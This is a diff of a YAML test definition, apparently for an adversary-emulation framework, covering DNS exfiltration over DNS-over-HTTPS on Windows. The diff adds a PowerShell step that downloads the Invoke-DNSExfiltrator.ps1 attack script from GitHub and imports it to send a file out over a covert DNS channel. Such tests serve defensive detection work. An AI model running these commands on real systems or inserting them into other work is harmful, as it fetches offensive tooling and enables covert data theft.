@@ -2,6 +2,9 @@ api_version: "2.0"
 name: DNSExfiltration (doh)
 description: "DNSExfiltrator enables the transfer (exfiltration) of a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator\n"
 args:
+    - name: encoding
+      type: string
+      default: <nil>
     - name: password
       type: string
       default: atomic
@@ -17,9 +20,6 @@ args:
     - name: time
       type: string
       default: "500"
-    - name: encoding
-      type: string
-      default: <nil>
 uuid: c943d285-ada3-45ca-b3aa-7cd6500c6a48
 mitre:
     tactics:
@@ -30,6 +30,13 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        DNSExfiltrator powershell file must exist on disk at specified location (#{ps_module})
+      inline: |
+        if (Test-Path "#{ps_module}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        IWR "https://raw.githubusercontent.com/Arno0x/DNSExfiltrator/8faa972408b0384416fffd5b4d42a7aa00526ca8/Invoke-DNSExfiltrator.ps1" -OutFile "#{ps_module}"
+        }}
+      executor: powershell
     - name: dnsexfiltration-(doh)
       inline: |
         Import-Module "{{.Args.ps_module}}"
